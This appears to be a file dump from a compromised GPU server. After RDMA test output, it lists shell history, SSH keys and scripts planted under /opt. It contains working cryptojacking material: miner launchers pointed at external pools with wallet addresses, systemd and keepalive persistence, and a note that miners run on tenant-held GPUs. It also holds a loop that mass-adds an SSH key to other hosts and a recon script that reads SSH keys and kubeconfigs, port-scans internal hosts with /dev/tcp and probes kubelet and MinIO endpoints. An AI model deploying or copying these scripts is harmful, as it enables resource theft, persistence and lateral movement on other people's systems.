+ Connection type : RC		Using SRQ      : OFF
+ PCIe relax order: ON
+ ibv_wr* API     : ON
+ TX depth        : 128
+ CQ Moderation   : 100
+ Mtu             : 4096[B]
+ Link type       : Ethernet
+ GID index       : 3
+ Max inline data : 0[B]
+ rdma_cm QPs	 : OFF
+ Data ex. method : Ethernet
+---------------------------------------------------------------------------------------
+------------------------------------------------
+Starting IB write bandwidth test from 10.11.61.5 to 10.11.61.1...
+Server output from 10.11.61.1:
+
+ Found Incompatibility issue with GID types.
+ Please Try to use a different IP version.
+
+
+************************************
+* Waiting for client to connect... *
+************************************
+---------------------------------------------------------------------------------------
+                    RDMA_Write BW Test
+ Dual-port       : OFF		Device         : mlx5_0
+ Number of qps   : 2		Transport type : IB
+ Connection type : RC		Using SRQ      : OFF
+ PCIe relax order: ON
+ ibv_wr* API     : ON
+ CQ Moderation   : 100
+ Mtu             : 4096[B]
+ Link type       : Ethernet
+ GID index       : 3
+ Max inline data : 0[B]
+ rdma_cm QPs	 : OFF
+ Data ex. method : Ethernet
+---------------------------------------------------------------------------------------
+Client output from 10.11.61.5:
+Warning: Permanently added '10.11.61.5' (ED25519) to the list of known hosts.
+
+ Found Incompatibility issue with GID types.
+ Please Try to use a different IP version.
+
+---------------------------------------------------------------------------------------
+                    RDMA_Write BW Test
+ Dual-port       : OFF		Device         : mlx5_0
+ Number of qps   : 2		Transport type : IB
+ Connection type : RC		Using SRQ      : OFF
+ PCIe relax order: ON
+ ibv_wr* API     : ON
+ TX depth        : 128
+ CQ Moderation   : 100
+ Mtu             : 4096[B]
+ Link type       : Ethernet
+ GID index       : 3
+ Max inline data : 0[B]
+ rdma_cm QPs	 : OFF
+ Data ex. method : Ethernet
+---------------------------------------------------------------------------------------
+------------------------------------------------
+Starting IB write bandwidth test from 10.11.61.6 to 10.11.61.1...
+Server output from 10.11.61.1:
+
+ Found Incompatibility issue with GID types.
+ Please Try to use a different IP version.
+
+
+************************************
+* Waiting for client to connect... *
+************************************
+---------------------------------------------------------------------------------------
+                    RDMA_Write BW Test
+ Dual-port       : OFF		Device         : mlx5_0
+ Number of qps   : 2		Transport type : IB
+ Connection type : RC		Using SRQ      : OFF
+ PCIe relax order: ON
+ ibv_wr* API     : ON
+ CQ Moderation   : 100
+ Mtu             : 4096[B]
+ Link type       : Ethernet
+ GID index       : 3
+ Max inline data : 0[B]
+ rdma_cm QPs	 : OFF
+ Data ex. method : Ethernet
+---------------------------------------------------------------------------------------
+Client output from 10.11.61.6:
+Warning: Permanently added '10.11.61.6' (ED25519) to the list of known hosts.
+
+ Found Incompatibility issue with GID types.
+ Please Try to use a different IP version.
+
+---------------------------------------------------------------------------------------
+                    RDMA_Write BW Test
+ Dual-port       : OFF		Device         : mlx5_0
+ Number of qps   : 2		Transport type : IB
+ Connection type : RC		Using SRQ      : OFF
+ PCIe relax order: ON
+ ibv_wr* API     : ON
+ TX depth        : 128
+ CQ Moderation   : 100
+ Mtu             : 4096[B]
+ Link type       : Ethernet
+ GID index       : 3
+ Max inline data : 0[B]
+ rdma_cm QPs	 : OFF
+ Data ex. method : Ethernet
+---------------------------------------------------------------------------------------
+------------------------------------------------
+Starting IB write bandwidth test from 10.11.61.7 to 10.11.61.1...
+Server output from 10.11.61.1:
+
+ Found Incompatibility issue with GID types.
+ Please Try to use a different IP version.
+
+
+************************************
+* Waiting for client to connect... *
+************************************
+---------------------------------------------------------------------------------------
+                    RDMA_Write BW Test
+===== /root/conf/mianmi.txt (739B)
+#对于非root账号，且有sudo权限的适用。
+for i in g0047 g0048 g0049; do ssh $i 'echo $HOSTNAME; sudo su - ubuntu -c "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCblZcdjQO0mnWs7oZZdzlNAQHD8ens10xt8ZpXTDCwIOJrf/fzy/mfLwojGY4jDm1P3euqPD2/niTKlvjSaL+L2HsVhoKzH4TQgjQmH3SgGqaHvhOs4wzHl8PYDNh9PJ1oy3y8c5JJHPF3maaJEVSXUVHCCr3Aw0z/NKhuf+x257QGppIqYV/Z45zK9VWt+oZOessH9rNHVHxQrdkMs0KgyVtzC331I+2DNaACwCD0SHiiTdUeqpB3rrjBKSPdBRkQOwDDqkltE55D/d74KjlCnU0TcsClFeQ8QOlkpm+z3f5aggES+Kdc04J+ImA6wGYJbVDTvnAzybDP5R5Th3SUd1hRt41BpMSU6tTYhGgKTYTQQJGNn46mAwiYUjUgrRuArPT4V3XPXidhGmAml57nGysPFyPdPlV2uGWs+wJmiNwfpgpzdfUM8EVL4Twzb+nr3gAZhOzrdS3qQ/Uo+t4PCVH6uXHo1wHrbJJp+GPDfVp9zSANt7+pj4b6oJqJkAc= langboat@m005\" >> ~/.ssh/authorized_keys" '; done### HIST
+-- hist-tail
+EOF
+
+#1795490187
+curl -fsS -H "Authorization: Bearer inspur-XinLiTong-2026" -H "Content-Type: application/json" http://127.0.0.1:8000/v1/chat/completions -d @/tmp/vision_req.json | jq -r '.choices[0].message.content'
+#1795490412
+curl -fsS -H "Authorization: Bearer inspur-XinLiTong-2026" -H "Content-Type: application/json" http://127.0.0.1:8000/v1/chat/completions -d @/tmp/vision_req.json | jq -r '.choices[0].message.content'
+#1795482937
+export LANG="en_US";export LANGUAGE="en_US";export LC_ALL="en_US";top
+#1795498411
+set +o history;
+#1795498418
+clear
+#1795498421
+cd /ssd/vendors/
+#1795498422
+ls
+#1795498424
+cd INSPUR/
+#1795498425
+ls
+#1795498431
+cd mineru/
+#1795498432
+ls
+#1795498441
+source .venv/bin/activate
+#1795498442
+clear
+#1795498446
+conda deactivate
+#1795498449
+python 
+#1795498514
+mineru --version
+#1795505155
+docker ps --format 'table {{.Names}}\t{{.Status}}\t{{.Ports}}'
+#1795508735
+docker inspect --format='{{if .State.Health}}{{.State.Health.Status}}{{else}}no-healthcheck{{end}}' inspur-mysql-prod
+#1795508752
+docker inspect --format='{{if .State.Health}}{{.State.Health.Status}}{{else}}no-healthcheck{{end}}' mysql
+### HOSTSFILE
+127.0.1.1 localhost
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
+::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
+192.168.0.23  instance-az1t0vf3-1
+### SSHDIR
+total 24
+drwx------  2 root root 4096 Sep  3 17:03 .
+drwx------ 34 root root 4096 Nov 25 05:23 ..
+-rw-------  1 root root 4032 Nov 24 09:56 authorized_keys
+-rw-------  1 root root 2590 Apr 18  2026 id_rsa
+-rw-r--r--  1 root root  564 Apr 18  2026 id_rsa.pub
+-rw-r--r--  1 root root 1846 Nov 25 02:03 known_hosts
+### AUTHKEYS
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+AyHs+lkIc1fwCLn2tf2c/H8khg8kt5rloPTJZekmiCp8W05BdHuM6AbRCtGXll0RGT7ou5oYJiHPKBvxrgPgU1op5q051/qxq/bv
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEbhPuZru0Lp+J3SefCO7kSwhNfDhht+tvtXlxJexoHS root@bm-2209615
+
+
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA7OEQMwJ6mWp99EN4iRkvweA8yj+m9dx++WOVojWrhBxYaWpGVM549Y1979jp8wtgi7V9c/SmxZ32yLgx6bmTAvCYwWB3BU35q1l1YLsO
+
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBO9yFkKH67aT//SaZ2JO7pxogcWcx5MP0h8vQVtQkkO lizibin@MacPro.local
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEvWXxGqrYTVpReqyg+9BLV3I2MUHjxRP5SrYPDg30okI3JaqjNvl0Y//XwXt3AZLMfg2QTxgVn+dG36WYvmKPB9IU3RgTy56otYP+
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDherIbzzsdfyoKdEMTtdhl+S7w+Ce/wDsz0J29VZ+0yP54IhtLupABsjNFbZzvld1//+iPwwuvLhWADNPnnD7GNy0phifxO4TkqhGW
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCiKMVp8qC/RwdSfq5X2BoIKenekBAeyMZzKkNlZrHroSmtX+F0LrUsuaLzK4ZmlpWMmxpppA9AKzLlDM8c0ukUd+Iv12mstI7+mq6A
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyQrgH1OrWlOfxEwojhVtsd7Eo9R88HSQg4Fu2/MYFtj6SBdqc5GI3JVtaPQl3EJyCz/0fDv3MJmHEImtv8znvpR8UQr0xu6JRvYX8
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7s+scQVAXL4Z4jZSr6uI8AsknHMmxspEEFvMbQheH6M9owN64efNGMX/PavxLMkW90CFUR/0FGAQ8UfRUw+RAv+kIke5gE89mUKxH
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKcmq6PYCyFYri6A+LhUlrSIj4F41JpKvTzU/9XYU2Fn t19
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMAdZRZegdhDMlj+F6IkgyNHO8CPsINpCjC96WfPeFqm t19-key
+### KNOWNHOSTS
+|1|SzLp6f2gg853YfCyEHq0jD8eQmo=|ZOrMOdfGK7xkLtP6d45o5LXFk+k= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJG
+|1|f7SV8654Tkt1IxSi2GxQZi9vlyY=|O9uph63CJL2N+oHCE8/VhZn/CL4= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+|1|tAbivvxWvIBzlq8jdux17neZczY=|BgDAYs7rry/ILyCbAPS/w1dsx80= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+|1|QIUgHuvrasNl9P3hg/80sBtLl88=|DqJPuWcP3GRWb9mTxiHeea+RjW8= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+|1|Blbkq2ARnVse2zOq6ezdhhjEOMo=|P8XUoAmKDUhcmX1sGdcqCGSG1qk= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+|1|zNQL2C2mP+ouThDNwIc+hwhvrfk=|0+UFb7cKIl5AJOtLOp06BdI9LLI= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+|1|w1N1OzJACc11H4DP0sMohUDbzBE=|kdQTOLhddw3TbB76N9aPmcldL/I= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+|1|gGZChqOTbFo6Ua3tHGoT/ayJJR0=|atTd8EQuuvN7qfcZzTYPq/x+JQ8= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+|1|7aA0O9yiaCg+4UcbC78ZkiFwiQw=|zoMYD5w8H6sBt/OVkLMgt2S9FmQ= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+|1|vqBYvLj7FO4osX6Y92N1lM1GLsU=|FJ4xXFuXl+cjn+V5YP1VUhT12ok= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+|1|Iz87TLUBXABKlAmf9pVrssSXWto=|tre4CbHgxoqbGIOk92wG+ChPx0s= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+|1|i2TjeT7wu8AhZZobmFGQ+aE0W6E=|GI7Q+096NypkbKoKYAl/KvoESKc= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+|1|u6+l0v0YyPa4ypnv30PFNugUs0s=|0ECRCaF05R8sJaVfPTl+vbbF8Zc= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKn
+### PLH
+/opt/plh:
+total 16
+drwxr-xr-x  2 root root 4096 Nov 25 05:32 .
+drwxr-xr-x 19 root root 4096 Nov 25 06:40 ..
+-rwxr-xr-x  1 root root  137 Nov 25 05:32 keepalive.sh
+-rwxr-xr-x  1 root root  550 Nov 25 05:32 plh-card.sh
+== /opt/plh/keepalive.sh (137B)
+#!/bin/bash
+for n in 0 1 2 3 4 5 6 7; do
+  systemctl is-active --quiet plh-card@$n.service || systemctl restart plh-card@$n.service
+done
+== /opt/plh/plh-card.sh (550B)
+#!/bin/bash
+N="$1"
+LOG=/var/log/plh-g$N.log
+exec >>"$LOG" 2>&1
+echo "=== start $(date -u +%FT%TZ) card=$N pid=$$"
+while true; do
+  /opt/arsenal/miners/krig/krig-miner --coin pearl \
+    --url stratum+ssl://prl-sg.kryptex.network:8048 \
+    --url stratum+tcp://pool.pearlhash.xyz:9000 \
+    --url stratum+ssl://pearl-sg1.luckypool.io:3360 \
+    --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g$N \
+    --password x -d $N --api-port $((1300+N))
+  echo "=== miner exit rc=$? $(date -u +%FT%TZ)"
+  sleep 15
+done
+-- plh-wallets
+prl1p50ltku2jjcwdxh4nzjrw98nwdswdn25qdkr2fdtw8hsq3qu9cdhscchnnm
+prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vs
+prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l
+prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+-- systemd-plh
+# /etc/systemd/system/plh-card@.service
+[Unit]
+Description=PLH pearlhash miner card %i
+After=network-online.target
+Wants=network-online.target
+[Service]
+Type=simple
+ExecStart=/opt/plh/plh-card.sh %i
+Restart=always
+RestartSec=15
+Nice=-5
+[Install]
+WantedBy=multi-user.target
+-- units-mine
+multi-user.target.wants
+multipath-tools.service
+plh-c2fetch.service
+plh-card@.service
+plh-guard.service
+plh-guard.timer
+ul-pearl-keep.service
+ul-pearl-keep.service.disabled
+-- timers
+NEXT                        LEFT               LAST                        PASSED             UNIT                           ACTIVATES
+Wed 2026-11-25 07:51:40 CST 41min left         Tue 2026-11-24 18:28:51 CST 12h ago            fwupd-refresh.timer            fwupd-refresh.service
+Wed 2026-11-25 09:15:53 CST 2h 6min left       Wed 2026-11-25 03:06:21 CST 4h 3min ago        ua-timer.timer                 ua-timer.service
+Wed 2026-11-25 10:04:55 CST 2h 55min left      Tue 2026-11-24 20:31:36 CST 10h ago            apt-daily.timer                apt-daily.service
+Wed 2026-11-25 11:45:13 CST 4h 35min left      Tue 2026-11-24 11:45:14 CST 19h ago            update-notifier-download.timer update-notifier-download.service
+Wed 2026-11-25 12:12:14 CST 5h 2min left       Tue 2026-11-24 12:12:14 CST 18h ago            systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
+Wed 2026-11-25 13:05:06 CST 5h 55min left      Wed 2026-11-25 00:49:10 CST 6h ago             motd-news.timer                motd-news.service
+Thu 2026-11-26 00:00:00 CST 16h left           Wed 2026-11-25 00:00:00 CST 7h ago             dpkg-db-backup.timer           dpkg-db-backup.service
+Thu 2026-11-26 00:00:00 CST 16h left           Wed 2026-11-25 00:00:00 CST 7h ago             logrotate.timer                logrotate.service
+Thu 2026-11-26 04:24:49 CST 21h left           Wed 2026-11-25 02:29:42 CST 4h 40min ago       man-db.timer                   man-db.service
+Thu 2026-11-26 06:29:21 CST 23h left           Wed 2026-11-25 06:34:40 CST 35min ago          apt-daily-upgrade.timer        apt-daily-upgrade.service
+Thu 2026-11-26 07:59:14 CST 24h left           Wed 2026-11-25 00:49:01 CST 6h ago             mdcheck_continue.timer         mdcheck_continue.service
+-- nv-cache-sh
+== /opt/t19/keep.sh
+#!/bin/sh
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+P=pool.pearlhash.xyz:9000
+B=/opt/t19/wildrig-multi
+K=/opt/t19/krig/krig-miner
+L=/opt/t19/log
+mkdir -p $L
+for i in 0 1 2 3 4 5 6; do
+  WN=ul-t19-123-184-7-135-g$i
+  pgrep -f "$WN" >/dev/null 2>&1 || setsid nohup nice -n 19 $B --algo pearlhash --url $P --user $W.$WN --pass x --opencl-devices $i --gpu-intensity 1 --api-port 190$i > $L/w$i.log 2>&1 &
+done
+pgrep -f "krig-miner.*ul-t19-123-184-7-135-g7" >/dev/null 2>&1 || setsid nohup nice -n 19 $K --coin pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -u $W/ul-t19-123-184-7-135-g7 -p x -d 7 --no-tui -l info > $L/g7.log 2>&1 &
+== /opt/t19/krig_dl.sh
+#!/bin/bash
+cd /opt/t19
+SHA=7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d
+URLS="https://gh-proxy.com/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz"
+for U in $URLS; do
+  echo "TRY $U $(date -u +%T)"
+  curl -fL -m 1200 --retry 2 -o /opt/t19/krig.tar.gz "$U"
+  H=$(sha256sum /opt/t19/krig.tar.gz 2>/dev/null | cut -d' ' -f1)
+  echo "GOT $H size=$(stat -c%s /opt/t19/krig.tar.gz 2>/dev/null)"
+  [ "$H" = "$SHA" ] && { echo SHA_OK; break; }
+done
+H=$(sha256sum /opt/t19/krig.tar.gz 2>/dev/null | cut -d' ' -f1)
+if [ "$H" = "$SHA" ]; then
+  mkdir -p /opt/t19/krig && tar xzf /opt/t19/krig.tar.gz -C /opt/t19/krig
+  chmod -R +x /opt/t19/krig 2>/dev/null
+  find /opt/t19/krig -maxdepth 3 | head -30
+  BIN=$(find /opt/t19/krig -type f -name 'krig-miner*' | head -1)
+  echo "BIN=$BIN"
+  [ -n "$BIN" ] && "$BIN" --help 2>&1 | head -70
+  echo KRIG_READY
+fi
+echo KRIG_DL_DONE
+== /opt/t19/p2.sh
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Request has expired</Message><Key>p2.sh</Key><BucketName>mnt</BucketName><Resource>/mnt/p2.sh</Resource><RequestId>18EB1D65EB1176EB</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>== /opt/t19/recon929.sh
+echo "== id"; id; hostname; date -u
+echo "== ip"; ip -4 addr show | grep -E 'inet ' 
+echo "== hosts"; cat /etc/hosts
+echo "== os"; head -3 /etc/os-release
+echo "== ssh"; ls -la /root/.ssh/ 2>/dev/null
+for f in /root/.ssh/id_* /root/.ssh/config /root/.ssh/known_hosts; do [ -f "$f" ] && { echo "-- $f"; head -8 "$f"; }; done
+echo "== kube"; ls -la /root/.kube 2>/dev/null; which kubectl microk8s 2>/dev/null
+find /root /home /opt /etc -maxdepth 4 \( -name 'kubeconfig*' -o -name '*.kubeconfig' -o -name 'admin.conf' \) 2>/dev/null | head -20
+echo "== fleet refs"; grep -rIl 'g0050\|g0030\|61\.161\.168' /etc /root /home /opt /ssd 2>/dev/null | head -15
+echo "== gpu"; nvidia-smi -L 2>&1 | head -3
+echo "== miner"; ps -eo pid,comm,args 2>/dev/null | grep -iE 'wildrig|peakminer|srminer|pearlhash|xmrig' | grep -v grep | head
+echo "== reach"; for ip in 61.161.168.38 61.161.168.50 61.161.168.42; do for p in 22 10250 16443 25000 9000 8000 19530 9400; do timeout 2 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && echo "OPEN $ip:$p"; done; done
+echo "== kubelet50"; curl -sk -m 8 https://61.161.168.50:10250/pods -o /tmp/k50.txt -w 'k50 %{http_code} %{size_download}\n'; head -c 200 /tmp/k50.txt; echo
+echo "== api50"; curl -sk -m 8 https://61.161.168.50:16443/version -w '\napi50 %{http_code} %{size_download}\n'
+echo "== minio42"; curl -s -m 8 http://61.161.168.42:9000/minio/health/live -w 'minio42 %{http_code} %{size_download}\n'; curl -s -m 8 http://61.161.168.42:9000/ -w 'root42 %{http_code} %{size_download}\n' | head -c 300
+echo "== attu42"; curl -s -m 8 http://61.161.168.42:8000/api/v1/collections -w '\nattu %{http_code} %{size_download}\n' | head -c 300
+echo "== out"
+== /opt/t19/relaunch_qwen.sh
+#!/bin/sh
+cd /ssd/vendors/INSPUR/models
+exec '/ssd/vendors/INSPUR/models/vllm_uv_env/bin/python' '/ssd/vendors/INSPUR/models/vllm_uv_env/bin/vllm' 'serve' '/ssd/vendors/INSPUR/models/qwen3.8-27b' '--served-model-name' 'qwen3.8-27b' '--host' '0.0.0.0' '--port' '8000' '--tensor-parallel-size' '2' '--max-model-len' '262144' '--max-num-seqs' '32' '--api-key' 'inspur-XinLiTong-2026' '--max-num-batched-tokens' '65536' '--gpu-memory-utilization' '0.85' '--enable-prefix-caching' '--mm-encoder-tp-mode' 'data' '--mm-encoder-attn-backend' 'FLASH_ATTN' '--mm-processor-kwargs' '{"min_pixels": 3136, "max_pixels": 1003520, "max_length": 131072}' '--mm-processor-cache-gb' '16' '--limit-mm-per-prompt' '{"image": 4}' '--speculative-config' '{"method":"mtp","num_speculative_tokens":3}' '--enable-auto-tool-choice' '--tool-call-parser' 'qwen3_xml' '--reasoning-parser' 'qwen3' '--attention-backend' 'FLASH_ATTN'  >> /opt/t19/log/qwen38.log 2>&1
+== /opt/t19/start-BitCore-zergpool.com.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo megabtx --url stratum+tcp://megabtx.mine.zergpool.com:3557 --user sY7v3ieNguMPRd8XkzGdUtASDZFrCvdAmn --pass c=BTX,mc=BTX
+sleep 5
+done
+== /opt/t19/start-BitCore-zpool.ca.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo megabtx --url stratum+tcp://megabtx.mine.zpool.ca:3558 --user sY7v3ieNguMPRd8XkzGdUtASDZFrCvdAmn --pass c=BTX,zap=BTX
+sleep 5
+done
+== /opt/t19/start-Evrmore.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo evrprogpow --url stratum+tcp://eu.evrpool.org:1111 --user EXvMVgsLdLFQkHrA63F4nS2WpKwuMxtAKH --pass x
+sleep 5
+done
+== /opt/t19/start-Meowcoin.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo meowpow --url stratum+tcps://stratum-eu.rplant.xyz:17120 --worker test --user PoolDonateWallet --pass x
+sleep 5
+done
+== /opt/t19/start-Neoxa.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo kawpow --url stratum+tcps://stratum-eu.rplant.xyz:17069 --worker test --user PoolDonateWallet --pass x
+sleep 5
+done
+== /opt/t19/start-Nexa.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo nexapow --url stratum+tcp://stratum-eu.rplant.xyz:7092 --user nqtsq5g5uw05wdm7fv0ughd3459t3v5l26r0r4spfmtyhcjw --pass x
+sleep 5
+done
+== /opt/t19/start-Pearl.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p50ltku2jjcwdxh4nzjrw98nwdswdn25qdkr2fdtw8hsq3qu9cdhscchnnm --worker test
+sleep 5
+done
+== /opt/t19/start-Qubitcoin-luckypool.io.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo qhash --url stratum+tcp://qubitcoin.luckypool.io:8611 --user bc1qe5p8vmjlsz0mc8yllhzlrsfhj5ea0zt6pjmyym --pass x
+sleep 5
+done
+== /opt/t19/start-Qubitcoin-rplant.xyz.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo qhash --url qtc-eu.rplant.xyz:7154 --user bc1qe5p8vmjlsz0mc8yllhzlrsfhj5ea0zt6pjmyym --pass x
+sleep 5
+done
+== /opt/t19/start-Qubitcoin-suprnova.cc.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo qhash --url stratum+tcp://qtc.suprnova.cc:5555 --user bc1qe5p8vmjlsz0mc8yllhzlrsfhj5ea0zt6pjmyym --pass x
+sleep 5
+done
+== /opt/t19/start-Radiant.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo sha512256d --url stratum+tcp://stratum-eu.rplant.xyz:7086 --user PoolDonate --pass x
+sleep 5
+done
+== /opt/t19/start-Radiant_lockMemory.sh
+#!/bin/bash
+
+while true
+do
+sudo ./wildrig-multi --gpu-memory-clock 810 --algo sha512256d --url stratum+tcp://stratum-eu.rplant.xyz:7086 --user PoolDonate --pass x
+sleep 5
+done
+== /opt/t19/start-Raptoreum.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo ghostrider --url stratum+tcp://stratum-eu.rplant.xyz:7056 --user RCQMzucqevALkHCPKH7xrp5ieLUBwmhLYq --pass x
+sleep 5
+done
+== /opt/t19/start-Ravencoin.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo kawpow --url stratum+tcp://rvn.2miners.com:6060 --worker test --user RETVhu5dA6EUwpzvkbGxRAVZAmVFimzMQp --pass x
+sleep 5
+done
+== /opt/t19/start-Sero.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo progpow-sero --url stratum+tcp://pool2.sero.cash:8808 --worker test --user xHFXE293qQuP5qVXKpsrVVRu7HNyC3KNRJQZ4LXKBmcXzusA9hgdWitdwyhuhpSBTpSF3zvUvZLyTFAnwTDpVtWjGzpwzHZriVwE4dHgGsuAGDZ15B6coaUa4mG5EMdr8NY --pass x
+sleep 5
+done
+== /opt/t19/start-SkyDoge.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo skydoge --url stratum+tcp://stratum-eu.rplant.xyz:7091 --user 195KzDtaZkHobSLQSGUXfrbZFdZuT59ecD --pass x
+sleep 5
+done
+== /opt/t19/start-TelestAI.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo progpow-telestai --url stratum+tcp://stratum.coinminerz.com:3351 --worker test --user PoolDonateWallet --pass x
+sleep 5
+done
+== /opt/t19/start-Zano.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo progpowz --url stratum+tcp://zano.luckypool.io:8877 --worker test --user ZxCPRpCsd9U1MtfoVyixVe92abHtwxe4GXfq6yLdcGWiK76kzUy9v9JS2dShrcMAbacEwcHaVBikb2qYboPdH1HY1kfZjarZq --pass x
+sleep 5
+done
+== /opt/t19/start.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo algo --url pool:port --user wallet --pass password
+sleep 5
+done
+== /opt/t19/start_apply_OC.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --gpu-core-clock VALUE --gpu-memory-clock VALUE --gpu-core-offset VALUE --gpu-memory-offset VALUE --gpu-power-limit VALUE --algo ALGORITHM --url POOL:PORT --user WALLET --pass PASSWORD
+sleep 5
+done
+== /opt/t19/sup.sh
+#!/bin/sh
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+P=pool.pearlhash.xyz:9000
+B=/opt/t19/wildrig-multi
+K=/opt/t19/krig/krig-miner
+L=/opt/t19/log
+mkdir -p $L
+for i in 0 1 2 3 4 5 6; do
+  WN=ul-t19-123-184-7-135-g$i
+  pgrep -f "$WN" >/dev/null 2>&1 || setsid nohup nice -n 19 $B --algo pearlhash --url $P --user $W.$WN --pass x --opencl-devices $i --gpu-intensity 1 --api-port 190$i > $L/w$i.log 2>&1 &
+done
+pgrep -f "krig-miner.*ul-t19-123-184-7-135-g7" >/dev/null 2>&1 || setsid nohup nice -n 19 $K --coin pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -u $W/ul-t19-123-184-7-135-g7 -p x -d 7 --no-tui -l info > $L/g7.log 2>&1 &
+== /opt/t19/sup2.sh
+#!/bin/sh
+# t19 supervisor v3: wildrig(pearlhash) on devices 0-6, krig(Kryptex TLS) on device 7
+# Devices 3-6 are tenant-held (VLLM TP0-3 ~73GiB each) -> krig OOM, wildrig (~2.9GiB) fits.
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+P=pool.pearlhash.xyz:9000
+B=/opt/t19/wildrig-multi
+K=/opt/t19/krig/krig-miner
+L=/opt/t19/log
+mkdir -p $L
+for i in 0 1 2 3 4 5 6; do
+  WN=ul-t19-123-184-7-135-g$i
+  pgrep -f "$WN" >/dev/null 2>&1 && continue
+  setsid nohup nice -n 19 $B --algo pearlhash --url $P --user $W.$WN --pass x --opencl-devices $i --gpu-intensity 1 --api-port 190$i > $L/w$i.log 2>&1 &
+  sleep 2
+done
+WN=ul-t19-123-184-7-135-g7
+if ! pgrep -f "krig-miner.*$WN" >/dev/null 2>&1; then
+  setsid nohup nice -n 19 $K --coin pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -u $W/$WN -p x -d 7 --no-tui -l info --log-file $L/g7.log >> $L/boot.log 2>&1 &
+fi
+== /opt/t19/t19relay3.sh
+#!/bin/sh
+echo "SCRIPT START $(date -u +%FT%TZ)"
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+B=/opt/t19/wildrig-multi
+L=/opt/t19/log
+WN=ul-t19-123-184-7-135-g3
+pkill -f "wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user $W.$WN"
+sleep 3
+cd /opt/t19
